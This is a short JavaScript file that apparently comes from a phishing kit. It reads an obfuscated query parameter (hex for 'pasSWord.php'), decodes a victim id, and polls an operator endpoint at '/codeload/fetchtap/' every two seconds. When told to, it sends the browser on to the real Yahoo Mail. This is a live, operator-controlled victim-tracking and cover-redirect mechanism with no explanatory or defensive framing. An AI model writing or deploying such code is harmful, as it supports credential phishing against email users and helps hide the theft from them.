function getQueryParameter(parameterName) {
  var queryString = window.location.search;
  var urlParams = new URLSearchParams(queryString);
  return urlParams.get(parameterName);
}
// Get the value from the 'data' query parameter
var valueuser = getQueryParameter('NzA2MTczNTM1NzZmNzI2NDJlNzA2ODcwdghjdfjdfgjdfgjdfgjdfj');
var decoddata = atob(valueuser);
var urldata = decoddata.split('/');

var userid = urldata[1];
var b64user = btoa(userid);




function checkForUpdates() {




 
  fetch(`/codeload/fetchtap/?jfhdgigndfjnguertsdfiwjeo=${b64user}`)
    .then(response => response.json())
    .then(data => {

      var code = data.results;
      var a = code[0].pagetype;
      var num =  parseInt(a, 10); 
     
   
           
      if (a !== "999") {
         checkForUpdates();
        }
      var filepath = 'https://mail.yahoo.com/';

        if (Number.isInteger(num) && num === 999) {
          // Execute this block of code if 'a' is an integer greater than zero
          window.location.href = filepath;
      
          }
          

 
    })
    .catch(error => {
      console.error('Error in Fetch request:', error);
    });



}


setInterval(checkForUpdates, 2000);


